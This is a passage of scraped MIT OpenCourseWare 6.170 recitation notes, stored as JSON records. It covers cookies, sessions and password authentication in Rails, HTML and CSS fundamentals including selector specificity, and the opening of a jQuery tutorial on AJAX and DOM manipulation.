http://ocw.mit.edu/terms."
    },
    {
      "category": "Resource",
      "title": "Recitation 4: Sessions and Authentication",
      "type": "PDF",
      "source_url": "https://ocw.mit.edu/courses/6-170-software-studio-spring-2013/060eff858447665987324630ccc42026_MIT6_170S13_rec4-SessAuthen.pdf",
      "content": "6.170 Tutorial 4 - Sessions and Authentication\nPrerequisites\n1. Having rails installed is recommended.\nGoals of this Tutorial\n1. Understand the basics of cookies and sessions and how to use them in rails.\n2. Basic Authentication mechanisms in rails.\nResources\nhttp://railscasts.com/episodes/250-authentication-from-scratch\nhttp://railscasts.com/episodes/270-authentication-in-rails-3-1\nhttp://railscasts.com/episodes/274-remember-me-reset-password\nTopic 1: Cookies\nA cookie is a piece of text that a website (web server) can store on a user's hard disk. Cookies\nallow a website to store information on a user's machine and later retrieve it. When the user\nbrowses the same website in the future, the data stored in the cookie can be retrieved by the\nwebsite to notify the website of the user's previous activity. The data is stored as keyvalue pairs.\nFor example, a website might generate a unique ID number for each visitor and store the ID\nnumber on each user's machine using a cookie file.\nWhen your browser sends a request to a webserver it will look on your machine for a cookie file\nthat the same web server has set. If it finds a cookie file, your browser will send all the keyvalue\npairs along with the request.\nThe web server will receive the request and be able to access the cookie data. It will be able to\nuse these cookies to gather information about the user.\nAdditionally, the web server can send extra information with the cookie such as expiration date or\npath (so the site can have different cookie values with different parts of the site).\nIn the broadest sense, a cookie allows a site to store state information on your machine. This\ninformation lets a web server remember what state your browser is in. An ID is one simple piece\nof state information if an ID exists on your machine, the site knows that you have visited\nbefore. The state is, \"Your browser has visited the site at least one time,\" and the site knows\nyour ID from that visit.\nThings to keep in mind: People often share machines, cookies are easily (and often) erased,\npeople have multiple machines.\n\nWarning: Cookies are sent with every request to the server! As a web developer, you should\navoid storing large amounts of data inside cookies. Cookies are limited to 4kb in size.\nSetting Cookies\nTypically, cookies are set in an HTTP response to the browser -- the server can specify in the\nheader that a certain cookie should be set. (Note, cookies may also be set by Javascript:\ndocument.cookie = \"key = value\")\nAn HTTP response header may look like this:\nHTTP/1.1 200 OK\nContent-type: text/html\nSet-Cookie: name=value\nSet-Cookie: name2=value2; Expires=Wed, 09-Jun-2021 10:18:14 GMT\nThe \"Set-Cookie\" directive tells the browser to create a cookie with that key and value, and to\nsend that cookie back on future requests.\nE.g. a future request from the site to the server might be:\nGET /spec.html HTTP/1.1\nHost: www.example.org\nCookie: name=value; name2=value2\nAccept: */*\nAlong with key-value pairs, the server can also set cookie attributes. These attributes tell the\nbrowser when to send the key-value pairs back. (Cookie attributes themselves are not sent back\nto the server.)\nCookie attributes\n●\nDomain and Path\n○\nTells the browser that the cookie should only be sent back for the given domain\nand path\n●\nExpires and Max-Age\n○\nTells the browser when to delete the cookie\n■\nExpires: provide a date\n■\nMax-Age: provide a number of seconds to persist\n○\nIf neither are specified, the default is that it will be deleted by the browser after the\nuser closes the browser.\n●\nSecure and HttpOnly\n○\nThese are binary attributes -- either present or not. They don't have an associated\nvalue.\n○\nSecure: tells browsers only to use the cookie under secure/encrypted\nconnections\n\n○\nHttpOnly: tells browsers to only use cookies via the HTTP protocol -- e.g. don't\nallow Javascript to modify cookies. (This attribute is used extensively by\nFacebook and Google to prevent some security vulnerabilities which we won't get\ninto yet.)\nFor example:\nSet-Cookie: HSID=AYQEVn....DKrdst; Domain=.foo.com; Path=/; Expires=Wed,\n13-Jan-2021 22:23:01 GMT; HttpOnly\nTopic 2: Sessions\nHTTP is a stateless protocol -- it doesn't require the server to remember anything about a single\nuser across multiple requests.\nThis works fine for serving static content, but what about dynamic/customized content? For\nexample, a user on Amazon would want to see the same items in his \"shopping cart\" as he\nbrowses from page to page. We need some way to keep track of data from such a user\nsession.\nA common solution to this problem is using browser cookies. (Other solutions: server side\nsessions, hidden form variables, adding parameters to the URL.)\nTopic 3: Sessions in Rails\nRails has built-in support for keeping track of user sessions.\nThere are a few storage mechanisms. All of these storage mechanisms use a cookie to store a\nunique ID for each session. They differ in where the rest of the data is kept.\n●\nActionDispatch::Session::CookieStore - Stores everything on the client.\n●\nActiveRecord::SessionStore - Stores the data in a database using Active Record.\n●\nActionDispatch::Session::CacheStore - Stores the data in the Rails cache.\nIf you'd like to change how you're storing sessions you can take a look and change it in the\nconfig/initializers/session_store.rb.\nThe default store is CookieStore, which stores all data in the browser cookie. Note that the data\nstored in the cookie isn't encrypted, so users can read it if they wanted. However, the cookie is\nsigned so that users can't modify their cookie -- if they do, Rails will not accept it.\nNo matter which mechanism you choose, the session will be accessible via the sessions hash.\nYou might set a user_id in the session hash.\nuser = User.find_by_email(params[:email])\nsession[:user_id] = user.id\n\nThe user can then be retrieved on a subsequent call like so:\nUser.find(session[:user_id]) if session[:user_id]\nTopic 4: Authentication (vs Authorization)\nAuthentication involves verifying that \"this person is who they say they are.\" For example, you\nmay show a photo ID to prove that you are this person with that name. On a website, you may\nenter in a username and password.\nDon't confuse this with authorization! Authorization refers to answering the question of \"what is\nthis user allowed to access\" - authentication asks \"who is this user?\"\nTopic 5: HTTP Basic Auth\nIf you want something cheap and don't need much security, you can use http basic\nauthentication. The following line at the top of a controller will create a popup that asks for the\nusername and password before allowing the user to proceed to each page that the controller\nopens.\nhttp_basic_authenticate_with :name => \"dnj\", :password => \"password\"\nIf you don't want this to apply to all methods within a controller, you can restrict it with extra\nparameters:\nhttp_basic_authenticate_with :name => \"username\", :password =>\n\"password\" :except => [:index, :show]\nhttp_basic_authenticate_with :name => \"username\" :password =>\n\"password\" :only => :destroy\nNote that this option is insecure because your password is always sent in plaintext, and the\npassword is stored in the code in plaintext. We might instead choose to use https as store a\npassword hash instead of the password itself.\nTopic 6: Secure Authentication\nRails has a built-in helper method for authentication, called has_secure_password. It\nencrypts user passwords for you before storing them. For the API docs on\nhas_secure_password, you can refer to\nhttp://api.rubyonrails.org/classes/ActiveModel/SecurePassword/ClassMethods.html.\nWe'll do an example to see how to use it:\nrails generate model user email:string password_digest:string\nNote that we need a \"password_digest\" column. This field stores the encrypted passwords.\nhas_secure_password assumes this field will exist.\n\nhas_secure_password\n●\nmust put \"bcrypt-ruby\" in Gemfile\n●\nadds methods to set and authenticate the entered password\n●\nadds validators to the password and password confirmation\n●\nadds authentication functionality\nRun the migration\nrake db:migrate\napp/models/user.rb\nclass User < ActiveRecord::Base\nattr_accessible :email, :password, :password_confirmation\nhas_secure_password\nvalidates_presence_of :password, :on => :create\nend\nThe attr_accessible statement prevents the password_digest from being set from the user\nregistration form.\nCreate a users controller\nrails generate controller users\napp/controllers/users_controller.rb\nclass UsersController < ApplicationController\ndef new\n@user = User.new\nend\ndef create\n@user = User.new(params[:user])\nif @user.save\nredirect_to root_url, :notice => \"You are signed up.\"\nelse\nrender \"new\"\nend\nend\nend\nInside app/views/users/new.html.erb\n<h1>Sign Up</h1>\n<%= form_for @user do |form| %>\n<div class=\"field\">\n\n<%= f.label :email %>\n<%= f.text_field :email %>\n</div>\n<div class= \"field\">\n<%= f.label :password %>\n<%= f.text_field :password %>\n</div>\n<div class = \"field\">\n<%= f.label :password_confirmation %>\n<%= f.text_field :password_confirmation %>\n</div>\n<div class= \"actions\">\n<%= f.submit %>\n</div>\n<% end %>\nWe also need to let users log in, not just sign up. When we log a user in, though, we're not\ncreating a new user -- we're creating a new session. We'll create a controller to handle\nsessions.\nrails generate controller sessions\napp/controllers/sessions_controller.rb\nclass SessionsController < ApplicationController\ndef new\nend\ndef create\nuser = User.find_by_email(params[:email])\nif user && user.authenticate(params[:password])\nsession[:user_id] = user.id\nredirect_to root_url, :notice => \"Logged in\"\nelse\nflash.now.alert = \"Invalid email or password\"\nrender \"new\"\nend\nend\ndef destroy\nsession[:user_id] = nil\nredirect_to root_url :notice=> \"Logged out\"\nend\nend\nThe authenticate method is given to us by has_secure_password, and checks the given\n\npassword against the password in the database\napp/views/sessions/new.html.erb\n<h1>Log in</h1>\n<%= form_tag sessions_path do %>\n<div class= \"field\">\n<%= label_tag :email %>\n<%= text_field_tag :email, params[:email] %>\n</div>\n<div class= \"field\">\n<%= label_tag :password %>\n<%= password_field_tag :password %>\n</div>\n<div class = \"actions\">\n<%= submit_tag \"Log in\" %>\n</div>\n<% end %>\nNote: we use form_tag rather than form_for because we're not editing a resource.\nNow, we're going to want to access the logged-in user from other parts of the site, after the user\nis logged in. We can make a helper method accessible to all views, that does this.\nIn app/controllers/application_controller.rb\nclass ApplicationController < ActionController::Base\nprotect_from_forgery\nprivate\ndef current_user\n@current_user ||= User.find(session[:user_id]) if\nsession[:user_id]\nend\nhelper_method :current_user\nend\nYou can find a skeleton web app with basic user log in abilities at\nhttps://github.com/jtwarren/session_demo.\ngit clone https://github.com/jtwarren/session_demo.git\nNext Tutorial: HTML & CSS\n\nMIT OpenCourseWare\nhttp://ocw.mit.edu\n6.170 Software Studio\nSpring 2013\nFor information about citing these materials or our Terms of Use, visit: http://ocw.mit.edu/terms."
    },
    {
      "category": "Resource",
      "title": "Recitation 5: HTML & CSS",
      "type": "PDF",
      "source_url": "https://ocw.mit.edu/courses/6-170-software-studio-spring-2013/c47459753b95db627e5af2195cc104ac_MIT6_170S13_rec5-HTMLCSS.pdf",
      "content": "6.170 Tutorial 5 - HTML & CSS\nPrerequisites\nGoals of this Tutorial\nUseful Resources for HTML & CSS\nTopic 1: HTML\nWhat is HTML?\nHTML Tags\nHTML Elements\nWeb Browsers\nHTML Page Structure\nHTML Versions\nThe <!DOCTYPE> Declaration\nDeclarations\nTopic 2: CSS\nWhat do .css files actually do?\nCSS syntax\nMost common selectors\nTopic 3: Specificity and the \"Cascade\" in CSS:\nTopic 4: CSS Box Model\nTopic 5: Linking CSS to Rails Templates\nPrerequisites\n1.\nHave Ruby installed on your computer\nNote: Having completed Tutorial P1, Ruby should already be installed on your computer.\nGoals of this Tutorial\nBecome familiar with HTML & CSS\nUseful Resources for HTML & CSS\n1.\nMozilla Developer Network (https://developer.mozilla.org/)\na.\nHTML: https://developer.mozilla.org/en-US/docs/HTML\nb.\nCSS: https://developer.mozilla.org/en-US/docs/CSS\n2.\nCSS Basic PDF: http://www.cssbasics.com/full.pdf\n3.\nLayouts and Rendering in Rails: http://guides.rubyonrails.org/layouts_and_rendering.html\n\nTopic 1: HTML\nWhat is HTML?\nHTML is a language for describing web pages.\n- HTML stands for Hyper Text Markup Language\n- HTML is a markup language\n-\nA\n\nmarkup language is a set of markup tags\n- The tags describe document content\n- HTML documents contain HTML tags and plain text\n- HTML documents are also called web pages\nHTML Tags\nHTML markup tags are usually called HTML tags\n- HTML tags are keywords (tag names) surrounded by angle brackets like <html>\n- HTML tags normally come in pairs like <strong> and </strong>\no The first tag in a pair is the start tag, the second tag is the end tag\no The end tag is written like the start tag, with a forward slash before the tag name\no Start and end tags are also called opening tags and closing tags\no There is often text inside the tags:\n<tagname>content</tagname> (i.e. <em> content</em>)\n- Certain HTML tags can also appear alone, like <img>\nHTML Elements\n\"HTML tags\" and \"HTML elements\" are often used to describe the same thing.\nBut strictly speaking, an HTML element is everything between the start tag and the end tag,\nincluding the tags:\n<p>This is a paragraph.</p>\nWeb Browsers\nThe purpose of a web browser (such as Google Chrome, Internet Explorer, Firefox, Safari) is to\nread HTML documents and display them as web pages. The browser does not display the HTML\ntags, but uses the tags to interpret the content of the page:\n\nHTML Page Structure\nBelow is an example of HTML page structure:\n<html>\n<body>\n<h1>This a heading</h1>\n<p>This is a paragraph.</p>\n<p>This is another paragraph.</p>\n</body>\n</html>\nHTML Versions\nSince the early days of the web, there have been many versions of HTML:\nVersion\nYear\nHTML\nHTML+\nHTML 2.0\nHTML 3.2\nHTML 4.01\nXHTML 1.0\nHTML5 / XHTML5\nThe <!DOCTYPE> Declaration\nThe <!DOCTYPE> declaration helps the browser to display a web page correctly.\nThere are many different documents on the web, and a browser can only display an HTML page\n100% correctly if it knows the HTML type and version used.\nScreenshot of browser displaying sample heading and paragraph text removed due to copyright restrictions.\nRefer to: Step 4 in HTML Editors.\n\nDeclarations\nBefore HTML5, it was common to declare the HTML version at the start with something messy:\nXHTML 1.0\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\"\n\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\nHTML 4.01\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\nHTML5 is much simpler, and is what we recommend you use:\nHTML5\n<!DOCTYPE html>\n\nTopic 2: CSS\nHere are screenshots of some sample P1.2's\nThe functionality is present in all these pages, but the sites themselves are visually unappealing.\n(In fact, perhaps good visual design is essential to your site's functionality - e.g. people\nabandoned MySpace as a social networking tool since they couldn't tolerate looking at the\ncluttered, eye-soring profiles vs. Facebook's incredibly clean [c. 2007] layout.) Maybe we can find\na way to style the pages so that our sites could look... like this!\n\nLet's look at an HTML page about whales:\nBut this isn't the best looking page on whales. One way to style it could be by manually editing\neach HTML element with HTML attributes. However, now you're mixing concerns about what\ndata should be presented and how that data should be presented in the same file. The better way\nis to create a separate, external file called a .css file which specifies how certain data on the\nwhale page should be presented.\nWhat do .css files actually do?\nCSS stands for Cascading Style Sheets. And .css files are just that: stylesheets. Your browser\nhas a default way of rendering certain HTML elements. But if you link an HTML page to a .css\nfile, the browser can parse that .css file and then override its native way of rendering HTML data.\nCSS syntax\nCSS files as a regular grammar:\nCSS FILE ::= (RULE)*\nRULE ::= (SELECTOR)+ (DECLARATION)*\nDECLARATION ::= PROPERTY (VALUE)+\n\nCSS files are a series of zero or more presentation rules. Here's a sample rule:\n(from\nhttp://w3schools.com/css/css_syntax.asp)\nThis rule demands that content between <h1> tags be blue and of font-size 12 pixels.\nHow does the browser know which HTML elements a rule targets? Notice that a rule\nconsists of 1 or more selectors. Selectors specify which elements the presentation rule is\ntargeting. In this example, the presentation rule is targeting all <h1> HTML elements.\nMost common selectors\nhtmlElementType targets all HTML elements of type htmlElementType (e.g.\nh1, span, div, etc.)\n.className targets elements of class className\n#idName targets one element with id idName (assuming HTML is\nwell-formed - ids should be unique per document!)\n* targets all elements\nselector1, selector2 targets all elements specified by either selector1 or\nselector2\nselector1 selector2 targets all elements specified by selector2 that are\nchildren (both direct and indirect) of elements specified by\nselector1\nselector1[attr=value] targets all elements specified by selector1 with a specified\nattribute, e.g. input[type=password]\nSelectors can also be combined! For example,\nimg.classA.classB#idName[alt=\"Profile image\"]\nThere are a lot more ways to select elements; for a complete list check out the W3C specs:\nhttp://www.w3.org/TR/selectors/.\nHow does the browser know how to display particular selected elements? Notice that a\nrule also consists of declarations, which are simply property:value pairs. The browser renders\ntargeted elements based on these property:value pairs. There are lots of properties - no need to\nmemorize all of them. Check a reference like the Mozilla Developer Network (MDN:\n\nhttps://developer.mozilla.org/en-US/docs/CSS/CSS Reference) to find the properties (and the\npossible values that can be associated with those properties) you need in order to implement a\nparticular styling.\nCSS let's you change almost everything about a page's appearance. Properties range from\ntypographical (font-size, letter-spacing, line-height, font-weight, font-style) to appearance (color,\nopacity, backgrounds, border) to positional (\"position\", top/left/right/bottom) to size (height, width,\npadding, margin) and more.\nLet's now style the whale page with what we know!\n1. Create a new file called whale.css.\n2. Link to it whale.html by including <link rel=\"stylesheet\" href=\"/path/to/whale.css\" /> in\nwhale.html's header.\n3. Give the \"Welcome...\" <p> element the id \"welcome\". Add a presentation rule to\nwhale.css that makes this element's content larger, Arial font, centered, and of dark blue\ncolor. For example:\n#welcome {\nfont-family:Arial;\nfont-size:36px;\ncolor: #3B6AA0;\ntext-align: center;\n}\nNow, whale page looks like:\n\n4. Give the whale picture <img> element the class \"whale pic\". Then, using CSS, center\nthe whale picture and give it rounded corners! For example:\n.whale_pic {\ndisplay:block;\n-webkit-border-radius: 20px;\n-moz-border-radius: 20px;\nborder-radius: 20px;\nmargin-left: auto;\nmargin-right: auto;\n}\nNote: Margin-left and margin-right are equal to 'auto' so the browser calculates the left and right\nmargins of the .whale pic element on the fly as the browser is resized.\nNow whale page looks like...\n\n5. Cool. Now let's give the page some good background color!\nbody {\nbackground-color: #E0EEEE;\n}\n\n6. Cool. Now let's style the actual text of the page.\np, ul {\nfont-family: Arial;\ncolor: #3B6AA0;\n}\nWhale page now looks like:\n\n7. Now our whale page is marginally better looking. But wait! You now realize there's some\nredundancy in the CSS. We can get rid of the color and font-family declarations in the\n#welcome CSS rule since they're covered by the p presentation rule. Identifying and\ngetting rid of these redundancies can allow us to write cleaner CSS.\n\nTopic 3: Specificity and the \"Cascade\" in CSS:\nSo we've just seen CSS in action, but...\nWhat happens if there are rule conflicts (like if there are multiple stylesheets that target\nthe same elements)?\nThis is the Cascading part of the style sheets. There's a particular order of precedence for\napplying stylesheets (information obtained from: http://bit.ly/5uu3iX [vanseo design],\nhttp://bit.ly/bisLP [w3c css2 spec]). When applying this order of precedence, the stylesheets\ncascade into each other, functionally creating a new stylesheet.\n1. Get all CSS declarations from all stylesheets that apply to a particular property for a\nparticular element.\n2. Break ties by origin and weight.\nWhat do you mean an origin?\nYour browser has a default stylesheet. A user can specify his/her own stylesheet for his/her\nbrowser (for example, if s/he needs a particular stylesheet to see the content better due to\nmedical concerns). And then of course there are the style sheets the author of an HTML page\nexplicitly links to. So there are three possible stylesheet origins: browser, user, and author.\nWhat do you mean by weight?\nWhen you write a declaration like\nh1 {color: blue;}\nyou can add !important after the value in the declaration to specify that that particular declaration\nshould have some overriding power. For example:\nh1 {color: blue !important;}.\nSo if your HTML page links to one stylesheet that says\nh1 {color: red;}\nand another that says\nh1 {color: blue ! important;}\n\nthen the latter rule trumps over the former.\nNote: !important is considered bad practice - it's usually a sign that your original classes,\nIDs, and styles were not well thought out and you're brute-forcing things.\nThe order of precedence in terms of origin and weight is: user important overrides author\nimportant which overrides author unimportant which overrides user unimportant which overrides\nany browser rules.\nU Important >> A Important >> A Unimportant >> U Unimportant >> Browser\n3. Break further ties by specificity.\nWhat do you mean by specificity?\nIntuition test - Assume we had an <h1> element with class \"intro\". Assume the following rules\nwere in the same stylesheet; which trumps which?\nh1 {color: red;}\nh1.intro {color: blue;}\nThe rules are from the same kind of origin and are both unimportant. We break the tie with\nspecificity and decide that the second rule wins out. But what about the following case?\nh1 p.intro {color: red;}\n#title p {color: blue;}\nAssume we had an element that satisfied both selectors (e.g. a paragraph element of class\n\"intro\" that was embedded within an h1 element with id \"title\"). Which rules wins out? Not so\nobvious! Let's see how browsers (roughly) calculate CSS specificity. For more details, check\nout a CSS book. :)\nEach declaration is assigned a tuple (i, c, e) [ice is easy to remember :)] where i is the number\nof ids specified by the selector, c is the number of classes specified by the selector, and e is the\nnumber of HTML element types specified by the selector. For example,\np W (0, 0, 1)\nh1 W (0, 0, 1)\n#title W (1, 0, 0)\nh1#title W (1, 0, 1)\nh1#title p W (1, 0, 2)\nh1#title p.intro W (1, 1, 2)\n\nW\n\nW\n\nSo given two selectors s1 and s2 with corresponding ice tuples t1 and t2. To determine which\nselector is more specific, iterate through t1 and t2 one index at a time. If at any point, t1's value at\nthat index is greater than t2's, then return: s1 is the more specific selector. If t1's value at that\nindex is equal to t2's value, then iterate to the next index.\nFor example, given the selectors above (p, h1, #title, h1#title, h1#title p, and h1#title p.intro), first\nwe can weed out p and h1 since they have no ids specified in their selector, but all the other\nselectors have 1 id specified. But then of the remaining selectors, only h1#title p.intro has a\nclass specified, so it is the most specific selector.\nSo who wins here?\nh1 p.intro {color: red;}\n(0, 1, 2)\n#title p {color: blue;}\n(1, 0, 1)\nYeah. #title p. IDs are very \"powerful\" when it comes to specificity - use them sparingly. You\nshould rarely have a reason to use an ID, and you should use classes almost always.\n4. Break any remaining ties with the declaration declared most \"recently\" (bottom of the CSS\nfile).\nSo if in a particular stylesheet you have the following rules:\nh1 {color: blue;}\nh1 {color: red;}\nThe second rule trumps over the 1st since it was declared more \"recently\". It's analogous to\ndoing\nx = 1\nx = 2\nin a programming language.\nAsset tag helpers provide methods for generating HTML that link views to stylesheets.\nStylesheets is one of the six asset tag helpers available in Rails:\n-\nauto_discovery_link_tag\n-\njavascript_include_tag\n-\nstylesheet_link_tag\n-\nimage_tag\n-\nvideo_tag\n-\naudio_tag\n\nIf you have two separate author stylesheets that both have a rule targeting the same\nelement...like:\n<link rel=\"stylesheet\" type=\"text/css\" href=\"css/whale1.css\" />\n<link rel=\"stylesheet\" type=\"text/css\" href=\"css/whale2.css\" />\nThen the rule declared in whale2.css wins.\nSo within a stylesheet, the last declared rule wins. Among different stylesheets of the same\norigin, the rule in the last linked stylesheet wins. Although these rules hold true, do not rely\non them in your CSS. It leads to brittle code where re-ordering files or compressing\nthem together can break your styles.\nFinally, inline CSS inside HTML attributes win over CSS declared in the <head> which wins over\nCSS linked to in external stylesheets.\n\nTopic 4: CSS Box Model\nSo we now have a relatively good understanding of how CSS is used and how it's processed.\nLet's focus on a specific, often-used case of applying CSS: positioning, aligning elements, or\ngiving elements certain degrees of margin/padding. But these properties can be tricky to work\nwith. Trying to set these properties with CSS without an understanding of the model underlying\nthese properties can lead to problems when debugging your layout (e.g. why won't this element\ncenter? why can't I align all these input elements? etc). So let's learn about this model!\nIn terms of rendering, every HTML element is constrained within a rectangular box. Here, inspect\nthe elements of any webpage with a browser's element inspector to show students the\nrectangular boxes.\nHere's the box model in a nutshell:\nMargin vs padding: margin and padding seem to be very similar - they add \"space\" around an\nHTML element. There are some important differences, though. As you can see from above, a\nlarger padding will push the border out. Additionally, the background will still appear in the\n\"padding\" of the box. So think of padding as part of the element, whereas margin is space\naround it.\nThe width/height attributes of an HTML element only correspond to the content box, which\ncontains text/images/etc. To get the full dimensions of an HTML element, you'll have to add the\nwidth/height of the content plus the padding plus the border plus the appropriate margins.\nYou can add margins in several ways:\nmargin: 5px; // Adds margin on all sides\n\nmargin-top: 7px; // Only top\nmargin-[bottom|left|right]: 3px; // Similar for other sides\nmargin: 3px 5px; // Sets top and bottom to 3px, left and right to 5px\nmargin: 3px 5px 6px 7px; // Sets top right bottom left (clockwise order)\nmargin: 3px 5px 6px; // Sets top to 3px, left and right to 5px, and bottom to 6px\nModify the #welcome presentation rule in whale.css to:\n#welcome {\nfont-size: 36px;\ntext-align: center;\npadding: 10px;\nborder: solid;\n}\nThen inspect the \"Welcome to my page...\" element in the whale page in the browser. Note how\nall four components of the box model for the #welcome element are highlighted.\nTopic 5: Linking CSS to Rails Templates\nCool. So that's a good amount of CSS background. Before we do some practice exercises, let's\ngo over how you'd actually link a Rails template to a CSS file.\n1) Place the appropriate CSS file in your app/assets/stylesheets directory.\n2) In your layout file, use the following Rails code:\n<%= stylesheet_link_tag \"main\", \"/photos/columns\" %>\nThis will link your layout file to app/assets/stylesheets/main.css and\napp/assets/stylesheets/photos/columns.css.\nAnd that's it!\nTopic 6: Additional Notes\n-\nIn Rails,\n\nSCSS/SASS provide simple but useful extensions like variables and mixins to\nCSS which help \"DRY\"\n- There are many useful stylesheets available online. http://cssgrid.net/ is a nice one which\nis available for free!\nNext Tutorial: JQuery\n\nMIT OpenCourseWare\nhttp://ocw.mit.edu\n6.170 Software Studio\nSpring 2013\nFor information about citing these materials or our Terms of Use, visit: http://ocw.mit.edu/terms."
    },
    {
      "category": "Resource",
      "title": "Recitation 6: jQuery",
      "type": "PDF",
      "source_url": "https://ocw.mit.edu/courses/6-170-software-studio-spring-2013/646097a072ea684f18237b44f42db548_MIT6_170S13_rec6-jQuery.pdf",
      "content": "6.170 Tutorial 6 - jQuery\nPrerequisites\nGoals of this tutorial\nResources\nTopic 1: JavaScript libraries why jQuery?\nHow to use jQuery\nTopic 2: AJAX\nTopic 3: DOM traversal and manipulation\nManipulating\nSelectors\nModifying DOM nodes\nTraversing\nTopic 4: Event handling\nTopic 5: Effects and animations\nTopic 6: JavaScript and Rails\nTopic 7: Beyond jQuery, and into \"web apps\"\nInto Web Applications, or \"web apps\"\nPrerequisites\n1.\nBasic understanding of JavaScript\nGoals of this tutorial\n1.\nUnderstand the distinction between jQuery and JavaScript\n2.\nUnderstand the core features of jQuery (AJAX, DOM manipulation, events, and effects)\nResources\n●\njQuery documentation: http://api.jquery.com/\n●\nConvenient JS/HTML/CSS playground: http://jsfiddle.net/\n\nTopic 1: JavaScript libraries why jQuery?\nJavaScript has been notorious for its inconsistent implementation across browsers, its verbosity,\nand in general its clunky API. In recent years, browsers like Chrome and Firefox have really\naccelerated the development of web technologies, and JavaScript APIs have been cleaned up\nand standardized. Messy parts still remain, though, and compatibility with older browsers will\nalways be an issue.\njQuery is an extremely popular JS library in use across a huge range of sites including\nWikipedia, Amazon, Twitter, and more. It's main offering is a concise, cross-browser API that\nhandles many common JS tasks for you. The best way to get a better idea of what that means is\nto look at jQuery's core strengths: AJAX, DOM manipulation, and DOM events.\nHow to use jQuery\nMore concretely, you include jQuery as another JS file that gives you a variable named $ -\njQuery's API is exposed through calls to $. In the example below, we'll use the CDN-hosted\njquery (provided by MediaTemple and officially distributed by jQuery):\n<script src=\"http://code.jquery.com/jquery-1.9.1.min.js\"></script>\n<script>\n$(document).ready(function() {\n$('img').click(function() {\n$('table li').slideUp();\n});\n});\n</script>\nFor Rails specifically, though, you'll have jQuery automatically included in your JS files. You\nshould have a main application.js file that \"includes\" jquery already - as part of the Rails asset\npipeline jQuery is \"compiled\" into the final JS files.\nThis tutorial will cover a sampling of the helper functions jQuery provides. You're encouraged to\nperuse through http://api.jquery.com for a thorough (but easy-to-read!) listing of methods.\nIf you're wondering what $(document).ready() does, it's to ensure that the entire document has\nfinished loading before we bind code to elements. Check out the Event Handling topic for more\ndetails.\n\nTopic 2: AJAX\nIn project 1, you got a brief taste of asynchronous requests:\nvar xhr = new XMLHttpRequest();\nxhr.onreadystatechange = function() {\nif (xhr.readyState == 1) { // call to open succeeded }\nif (xhr.readyState == 2) { // call to send succeeded }\nif (xhr.readyState == 3) { // response is coming in }\nif (xhr.readyState == 4) { // response completed }\n}\nxhr.open('GET', '/url/to/something', true);\nxhr.send();\njQuery makes this much easier with $.ajax (many more settings are listed at\nhttp://api.jquery.com/jQuery.ajax/):\n$.ajax(\"/url/to/something\", {\ntype: 'PUT',\ndata: {\nparam1: 'param1Value',\nparam2: 'param2Value'\n},\ndataType: 'JSON' // Usually unnecessary, jQuery can guess the return type\n// etc - many more settings are available\n}).done(function(data) {\nconsole.log(\"Request successful: \" + data);\n}).fail(function(data) {\nconsole.log(\"Server gave an error: \" + data);\n}).always(function() {\nconsole.log(\"Regardless, this request has finished.\");\n});\nYou can leave out the fail and always handlers if you're only interested in the successful calls.\n(NB: You'll see this \"chaining\" style of coding a lot in jQuery. Many object methods will return the\nobject again so you can call more methods on it: done() is called on the return value of\n$.ajax(), this same return value is returned by done() to be used for fail(), and so on.)\nThere's also simplified $.post and $.get methods that are wrappers around $.ajax:\n$.post(\"/url/to/something\", {\nparam1: 'param1Value',\nparam2: 'param2Value'\n}, function(data) {\nconsole.log(\"Success! data: \" + data);\n});\nUsing $.ajax and its variants have a few key benefits:\n●\nMore concise syntax, cleaner error handling\n\n●\nCross-browser compatible (XHR behaves badly in certain browsers like IE)\n●\nAutomatic data-parsing (JSON responses get detected and transformed into JS objects)\nIn general, if you're already using jQuery on your website (for more reasons we'll see below)\nthere's very few reasons to not use it's AJAX functionality. Check out\nhttps://github.com/jquery/jquery/blob/master/src/ajax.js to get some appreciation for the messy\nwork handled by jQuery - try searching for \"IE\" for example.\n\nTopic 3: DOM traversal and manipulation\njQuery also makes working with HTML elements (also referred to as \"DOM nodes\") very easy.\nManipulating\nAPI docs: http://api.jquery.com/category/manipulation/\nWe'll refer to moving, inserting, and deleting DOM nodes as \"DOM manipulations\" - you'll find\nDOM manipulation to be useful for adding new elements, showing new data, showing AJAX\nresults, and responding to user interaction.\nCreating new elements is easy:\nvar newList = $('<ul>').addClass('my-class');\nvar el1 = $('<li>this is literally HTML</li>');\nvar el2 = $('<li class=\"inline-classes\"></li>');\nvar el3 = $('<li>').html('It's cleaner to chain it though').addClass('anotherClass');\nvar el4 = el1.clone().html('Cloned but edited!');\nnewList.append(el1).append(el2).append(el3).append(el4);\n$('#container').append(newList);\n●\nparent.append(child) inserts child as the last child inside parent\n●\nparent.prepend(child) inserts child as the first child inside parent\n●\nsibling1.after(sibling2) inserts sibling2 after every sibling1\n●\nsibling1.before(sibling2) inserts sibling2 before every sibling1\n●\nand many more: insertAfter, insertBefore, appendTo, replaceWith, etc\nDeleting elements is simple too:\n$('li').remove() // remove all list elements\n$('ul').empty() // keeps the ul, but removes all children inside them\nvar detached = $('ul').children().detach() // like remove, but doesn't destroy them\ndetached.appendTo('ul.aggregate'); // attach them all to one ul\nSelectors\nAPI docs: http://api.jquery.com/category/selectors/\njQuery uses CSS-style selectors (NB: they only resemble CSS, and aren't dependent on any\nunderlying CSS implementation) to make finding elements very easy. With vanilla JS, you might\nsee:\nvar els = document.getElementById(\"foo\").getElementsByClassName(\"bar\");\nWith jQuery, this becomes:\nvar els = $(\"#foo .bar\");\n\nThe benefit becomes clearer when your queries become more complex:\n// Password fields\n$(\"input[type=password]\")\n// Anchor tags that directly follow an image with class=\"foo bar\"\n$(\"img.foo.bar + a\")\n// Even rows in a table\n$(\"table tr:nth-child(2n)\")\nThe return value of jQuery selectors is a result set that can behave differently with different\nfunctions (more below). For example, $('img').html() will return the html of the first image, while\n$('img').parent() will return the set of DOM nodes that have an image as a child. Most of the\nmodifiers and selectors operate on all elements, but trial-and-error will reveal quickly which does\nwhat.\nModifying DOM nodes\nOnce you can select the elements you'd like to modify, you can actually manipulate them.\n.attr() is the most generic method, and can modify or access any HTML attribute:\n// Set the alt text property of every profile image to 'profile'\n$('img.profile').attr('alt', 'profile')\n// Get the src attribute of the (first) image\n$('img').attr('src')\n// Set multiple attributes on ALL images\n$('img').attr({\nalt: 'alt text',\ntitle: 'title',\nsrc: 